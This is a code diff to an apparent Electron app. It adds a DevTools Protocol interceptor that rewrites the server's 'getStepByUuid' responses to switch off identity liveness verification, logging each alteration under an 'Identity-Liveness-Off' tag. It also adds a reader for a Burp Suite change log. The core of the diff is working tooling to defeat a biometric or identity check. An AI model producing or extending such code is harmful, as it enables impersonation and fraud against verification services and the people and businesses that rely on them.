+      try { await mainWin.webContents.debugger.sendCommand('Fetch.continueRequest', { requestId: params.requestId }); } catch (e) {}
+      return;
+    }
+    const requestUrl = params.request?.url || '';
+    if (requestUrl.indexOf('getStepByUuid') === -1) {
+      try { await mainWin.webContents.debugger.sendCommand('Fetch.continueRequest', { requestId: params.requestId }); } catch (e) {}
+      return;
+    }
+    try {
+      const { body, base64Encoded } = await mainWin.webContents.debugger.sendCommand('Fetch.getResponseBody', { requestId: params.requestId });
+      const rawBody = base64Encoded ? Buffer.from(body, 'base64').toString('utf8') : body;
+      const modifiedBody = applyIdentityLivenessOffToResponseBody(rawBody);
+      const bodyBase64 = Buffer.from(modifiedBody, 'utf8').toString('base64');
+      const headers = (params.responseHeaders || []).map((h) => ({ name: h.name, value: h.value }));
+      await mainWin.webContents.debugger.sendCommand('Fetch.fulfillRequest', {
+        requestId: params.requestId,
+        responseCode: params.responseStatusCode || 200,
+        responseHeaders: headers,
+        body: bodyBase64,
+      });
+      console.log('[Identity-Liveness-Off] CDP: resposta getStepByUuid alterada (processo principal)');
+    } catch (e) {
+      console.warn('[Identity-Liveness-Off] CDP fulfillRequest failed:', e?.message);
+      try { await mainWin.webContents.debugger.sendCommand('Fetch.continueRequest', { requestId: params.requestId }); } catch (e2) {}
+    }
+  };
+  mainWin.webContents.debugger.on('message', fetchInterceptorMessageHandler);
+
+  mainWin.webContents.debugger.sendCommand('Fetch.enable', {
+    patterns: [{ urlPattern: '*getStepByUuid*', requestStage: 'Response' }],
+  }).catch((e) => {
+    console.warn('[Identity-Liveness-Off] Fetch.enable failed:', e?.message);
+    fetchInterceptorAttached = false;
+  });
+}
 
 // Handler para obter logs de upload da janela principal
 ipcMain.handle('logs:getUploadLogs', async () => {
-  if (!mainWin || mainWin.isDestroyed()) {
-    return { logs: [], error: 'Janela principal não está disponível' };
-  }
-  
   try {
-    const logs = await mainWin.webContents.executeJavaScript(`
-      (function() {
-        if (typeof window.__UPLOAD_LOGS !== 'undefined') {
-          return window.__UPLOAD_LOGS || [];
-        }
-        return [];
-      })()
-    `);
-    
-    return { logs: logs || [], error: null };
+    const logsDir = path.join(__dirname, '..', 'logs');
+    const sessionLogFile = path.join(logsDir, 'upload-logs-session.json');
+    if (!fs.existsSync(sessionLogFile)) {
+      // Fallback: tentar ler direto da janela, se existir
+      if (!mainWin || mainWin.isDestroyed()) {
+        return { logs: [], error: null };
+      }
+      const logs = await mainWin.webContents.executeJavaScript(`
+        (function() {
+          if (typeof window.__UPLOAD_LOGS !== 'undefined') {
+            return window.__UPLOAD_LOGS || [];
+          }
+          return [];
+        })()
+      `);
+      return { logs: logs || [], error: null };
+    }
+    const raw = fs.readFileSync(sessionLogFile, 'utf8');
+    const logs = JSON.parse(raw);
+    return { logs: Array.isArray(logs) ? logs : [], error: null };
   } catch (e) {
     return { logs: [], error: e.message };
   }
@@ -1385,6 +1817,31 @@ ipcMain.on('logs:saveToFile', async (_event, logs) => {
     console.log(`[Logs] Salvos ${logs.length} logs em ${sessionLogFile}`);
   } catch (e) {
     console.warn('[Logs] Erro ao salvar logs:', e);
+  }
+});
+
+// Handler para ler o log de mudanças do Burp (burp-changes-log.jsonl)
+ipcMain.handle('burp:getChangesLog', async () => {
+  try {
+    const logFile = path.join(projectRoot, 'burp-changes-log.jsonl');
+    if (!fs.existsSync(logFile)) {
+      return { entries: [], error: null };
+    }
+    const content = fs.readFileSync(logFile, 'utf8');
+    const lines = content.split('\n').filter((l) => l.trim().length > 0);
+    const last = lines.slice(-50); // últimos 50 eventos
+    const entries = [];
+    last.forEach((line) => {
+      try {
+        const obj = JSON.parse(line);
+        entries.push(obj);
+      } catch (e) {
+        // ignora linha inválida
+      }
+    });
+    return { entries, error: null };
+  } catch (e) {
+    return { entries: [], error: e?.message || String(e) };
   }
 });
 
